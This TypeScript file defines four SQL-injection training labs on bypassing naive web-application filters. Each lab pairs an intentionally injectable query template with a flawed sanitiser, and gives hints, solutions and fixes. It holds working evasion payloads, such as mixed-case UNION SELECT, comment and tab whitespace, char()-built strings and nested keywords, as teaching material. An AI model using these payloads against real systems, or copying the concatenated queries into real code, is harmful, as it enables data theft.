import type { Lab } from '../types';
import { productsSeed, secretsSeed } from './seeds';
import { fail, findFlag, pass } from './helpers';

/** Case-sensitive, single-pass keyword stripping: exactly how a home-made WAF looks. */
function stripKeyword(value: string, keywords: string[], notes: string[]): string {
  let out = value;
  for (const kw of keywords) {
    if (out.includes(kw)) {
      out = out.split(kw).join('');
      notes.push(`Input sanitizer stripped the keyword \`${kw}\` (case-sensitive, global).`);
    }
  }
  return out;
}

export const bypassLabs: Lab[] = [
  {
    id: 'waf-case',
    title: 'Case-Sensitive Blacklist',
    category: 'bypass',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'The filter removes `union` and `select` — but only in lowercase. SQL keywords were never case-sensitive.',
    brief: [
      'Someone added a "security filter" that deletes banned words before the query runs. It uses a case-sensitive string replace, which means it only catches people who type like the developer.',
      'This lab exists because filters like this ship constantly. Blacklists fail because SQL has an enormous grammar and the filter author has to guess every spelling of every attack.',
    ],
    objective: 'Extract the secret despite the keyword filter.',
    appURL: 'https://shop.trailhead-outfitters.com/category?c=shoes',
    seed: [...productsSeed(), ...secretsSeed('FLAG{waf_case_bypass}')],
    fields: [{ id: 'category', label: 'category parameter', placeholder: 'shoes', value: 'shoes' }],
    filter: (values) => {
      const notes: string[] = [];
      const out: Record<string, string> = {};
      for (const [k, v] of Object.entries(values)) {
        out[k] = stripKeyword(v, ['union', 'select'], notes);
      }
      return { values: out, notes };
    },
    query: (v) => `SELECT id, name, price FROM products WHERE category = '${v.category}'`,
    hints: [
      'The filter is a string replace with `includes`, which is case-sensitive.',
      'SQL keywords are not.',
      'Try `UNION SELECT` in capitals. Then check the "filtered input" line in the response to see exactly what the app sent.',
    ],
    walkthrough: [
      {
        title: 'Watch the filter eat your payload',
        text: ['Submit a normal payload and read the "filtered input" line — the app shows you what it removed.'],
        payload: `x' union select 0, name, value from secrets--`,
        result: 'Filtered input has the words removed: `x\'  0, name, value from secrets--` — broken SQL.',
      },
      {
        title: 'Change the case',
        text: ['Case-sensitive comparison, case-insensitive language.'],
        payload: `x' UnIoN SeLeCt 0, name, value FROM secrets--`,
        result: 'Filter finds nothing to strip; SQLite does not care about case. Flag extracted.',
      },
      {
        title: 'Other spellings of the same idea',
        text: [
          'Inline comments inside keywords: `UN/**/ION SEL/**/ECT` works in MySQL and MSSQL.',
          'URL/HTML encoding, double-encoding: `%55NION`, `%2555NION`. Unicode look-alikes where the filter normalises differently than the driver.',
          'Whitespace variants between keywords: tab, newline, form feed, `/*x*/`, `%0a`.',
          'Alternative keywords: `||` instead of `OR`, `IN` instead of `=`, `HAVING` instead of `WHERE`, subqueries instead of UNION.',
        ],
      },
      {
        title: 'Fix',
        text: ['Never blacklist. Parameterise the query so no keyword can ever be data. A WAF is a compensating control, not a fix.'],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Filter bypassed, secret extracted: ${flag}`);
      return fail('Keyword still removed. Look at the filtered input line and find a spelling the filter misses.');
    },
    solution: { category: `x' UnIoN SeLeCt 0, name, value FROM secrets--` },
  },

  {
    id: 'waf-spaces',
    title: 'Space Filtering and Comment Whitespace',
    category: 'bypass',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'All spaces are stripped from your input. SQL has five other ways to separate tokens.',
    brief: [
      'This filter removes every space character. It is a popular idea because it makes payloads look mangled in the logs.',
      'It also does nothing, because whitespace in SQL is any character the lexer considers whitespace — and comments count as whitespace too.',
    ],
    objective: 'Extract the secret with zero spaces in your payload.',
    appURL: 'https://shop.trailhead-outfitters.com/category?c=shoes',
    seed: [...productsSeed(), ...secretsSeed('FLAG{waf_space_bypass}')],
    fields: [{ id: 'category', label: 'category parameter', placeholder: 'shoes', value: 'shoes' }],
    filter: (values) => {
      const notes: string[] = [];
      const out: Record<string, string> = {};
      for (const [k, v] of Object.entries(values)) {
        const cleaned = v.replace(/ /g, '');
        if (cleaned !== v) notes.push('Input sanitizer removed every space character.');
        out[k] = cleaned;
      }
      return { values: out, notes };
    },
    query: (v) => `SELECT id, name, price FROM products WHERE category = '${v.category}'`,
    hints: [
      'A comment behaves exactly like a space to the SQL lexer: `SELECT/**/1` is valid.',
      'Tabs and newlines are still whitespace and usually survive a "remove spaces" filter.',
      'Commas and parentheses do not need spaces: `0,name,value` is fine.',
    ],
    walkthrough: [
      {
        title: 'The naive payload dies',
        text: ['Spaces removed → tokens run together → syntax error.'],
        payload: `x' UNION SELECT 0, name, value FROM secrets--`,
        result: `x'UNIONSELECT0,name,valueFROMsecrets--`,
      },
      {
        title: 'Substitute comment whitespace',
        text: ['`/**/` is a zero-length comment that the lexer treats as a separator.'],
        payload: `x'/**/UNION/**/SELECT/**/0,name,value/**/FROM/**/secrets--`,
        result: 'Valid SQL, flag extracted. Note the commas needed no help.',
      },
      {
        title: 'Alternative separators',
        text: [
          'A tab character (`%09` in a URL) is whitespace and survives `replace(" ", "")`.',
          'Newlines (`%0a`), carriage returns (`%0d`), form feeds (`%0c`), vertical tabs.',
          'Parentheses as grouping: `UNION(SELECT(0),name,value FROM secrets)` — MySQL and SQLite accept it.',
        ],
        payload: `x'%09UNION%09SELECT%090,name,value%09FROM%09secrets--`,
      },
      {
        title: 'Fix',
        text: ['Whitespace filtering is not a security control. Parameterise.'],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Space-free payload worked: ${flag}`);
      return fail('Tokens are still running together. Replace the spaces with comments or tabs.');
    },
    solution: { category: `x'/**/UNION/**/SELECT/**/0,name,value/**/FROM/**/secrets--` },
  },

  {
    id: 'waf-quotes',
    title: 'Quote Filtering: Injection Without Quotes',
    category: 'bypass',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'Both quote characters are stripped. That only matters if you needed a string — and you do not.',
    brief: [
      'This filter removes single and double quotes from every parameter, which is the second most common "SQL injection fix" after magic quotes.',
      'Two problems: a numeric context needs no quotes, and every engine has a way to build a string with no quote character in sight.',
    ],
    objective: 'Extract the secret with no quote characters in your input at all.',
    appURL: 'https://shop.trailhead-outfitters.com/product?id=1',
    seed: [...productsSeed(), ...secretsSeed('FLAG{waf_quote_bypass}')],
    fields: [{ id: 'id', label: 'id parameter', placeholder: '1', value: '1' }],
    filter: (values) => {
      const notes: string[] = [];
      const out: Record<string, string> = {};
      for (const [k, v] of Object.entries(values)) {
        const cleaned = v.replace(/['"]/g, '');
        if (cleaned !== v) notes.push(`Input sanitizer stripped ${v.length - cleaned.length} quote character(s).`);
        out[k] = cleaned;
      }
      return { values: out, notes };
    },
    query: (v) => `SELECT id, name, price FROM products WHERE id = ${v.id}`,
    hints: [
      'The parameter is numeric — there is no string literal to break out of.',
      'UNION SELECT needs no quotes unless you are comparing against a string.',
      'When you *do* need a string, `char(70,76,65,71)` builds one from character codes in SQLite and MySQL.',
    ],
    walkthrough: [
      {
        title: 'Notice the context',
        text: ['`WHERE id = <input>` — no quotes anywhere in the template. The filter is irrelevant.'],
        payload: `0 UNION SELECT 0, name, value FROM secrets`,
        result: 'No quote characters were used or needed. Flag extracted.',
      },
      {
        title: 'When a string is unavoidable',
        text: [
          'If you need a literal to compare against, build it from numbers.',
          'SQLite / MySQL: `char(70,76,65,71)` → "FLAG". MSSQL: `CHAR(70)+CHAR(76)`. PostgreSQL: `CHR(70)||CHR(76)`. Oracle: `CHR(70)||CHR(76)` from `dual`.',
          'Alternatively use `0x` hex literals (MySQL), `$$string$$` dollar quoting (PostgreSQL) or `N\'...\'` (MSSQL) — all evade a naive quote regex.',
        ],
        payload: `0 UNION SELECT 0, name, value FROM secrets WHERE name=char(115,116,114,105,112,101,95,108,105,118,101,95,107,101,121)`,
        result: 'Same result, still zero quote characters.',
      },
      {
        title: 'Also worth knowing',
        text: [
          'If your quote is stripped but the parameter goes into a JSON or XML function, try building the quote itself with `char(39)` (a single quote is character 39).',
          'That makes `admin` + char(39) + `--` reconstructable even when every literal quote is removed.',
        ],
        payload: `0 UNION SELECT 0, char(39,45,45), value FROM secrets`,
      },
      {
        title: 'Fix',
        text: ['Stripping quotes is not escaping, and escaping is not parameterisation. Bind the integer as an integer.'],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Quote-free injection succeeded: ${flag}`);
      return fail('Still no flag. Remember: the parameter is numeric, so you never needed a quote.');
    },
    solution: { id: `0 UNION SELECT 0, name, value FROM secrets` },
    probe: {
      values: { id: `0 UNION SELECT 0, char(39,45,45), value FROM secrets` },
      expect: 'rows',
    },
  },

  {
    id: 'waf-recursive',
    title: 'Recursive Stripping',
    category: 'bypass',
    difficulty: 'Expert',
    dbms: 'SQLite',
    summary: 'The filter removes banned words once, in a single pass. Nested keywords reassemble after the removal.',
    brief: [
      'This filter is a step up: it deletes `union` and `select` wherever they appear, using a single global replace per keyword.',
      'Single-pass replacement is the flaw. If removing a substring creates a new keyword spanning the join, the filter manufactures the very token it was trying to ban.',
    ],
    objective: 'Bypass the stripping with a payload that reassembles into valid SQL.',
    appURL: 'https://shop.trailhead-outfitters.com/category?c=shoes',
    seed: [...productsSeed(), ...secretsSeed('FLAG{waf_recursive_bypass}')],
    fields: [{ id: 'category', label: 'category parameter', placeholder: 'shoes', value: 'shoes' }],
    filter: (values) => {
      const notes: string[] = [];
      const out: Record<string, string> = {};
      for (const [k, v] of Object.entries(values)) {
        const before = v;
        const cleaned = v.replace(/union/g, '').replace(/select/g, '');
        if (cleaned !== before) notes.push('Input sanitizer removed each banned substring once (single pass).');
        out[k] = cleaned;
      }
      return { values: out, notes };
    },
    query: (v) => `SELECT id, name, price FROM products WHERE category = '${v.category}'`,
    hints: [
      'The filter runs `replace` exactly once per keyword.',
      'If the removed word sits inside another word, the two halves join up.',
      '`un` + `union` + `ion` = `ununionion`. Remove the middle and you get `union` back.',
    ],
    walkthrough: [
      {
        title: 'Understand the transform',
        text: [
          'Run the filter mentally on `ununionion`: it contains the substring `union` starting at index 2. Delete it and the remaining fragments `un` and `ion` concatenate into `union`.',
          'Same trick for `seselectlect`.',
        ],
        payload: `ununionion seselectlect`,
        result: 'After filtering: `union select`.',
      },
      {
        title: 'Assemble the full payload',
        text: ['Nothing else in the payload contains a banned keyword — watch out for words like `selection` in your table names.'],
        payload: `x' ununionion seselectlect 0, name, value from secrets--`,
        result: 'Filter output is a clean UNION SELECT. Flag extracted.',
      },
      {
        title: 'Variations on the theme',
        text: [
          'If the filter is a `while` loop instead of a single pass, double-nest: `unununionionion`.',
          'If it strips repeatedly until stable, use a different route entirely: `||` concatenation, `EXCEPT`/`INTERSECT`, subqueries in the WHERE clause, or `HAVING` instead of `WHERE`.',
          'This is why blacklists cannot work: the search space of equivalent SQL is effectively infinite.',
        ],
      },
      {
        title: 'Fix',
        text: ['Parameterisation. Then a WAF as defence in depth — never as the primary control.'],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Reassembled payload executed: ${flag}`);
      return fail('Your payload still got stripped to nonsense. Nest the keyword inside itself.');
    },
    solution: { category: `x' ununionion seselectlect 0, name, value from secrets--` },
  },
];
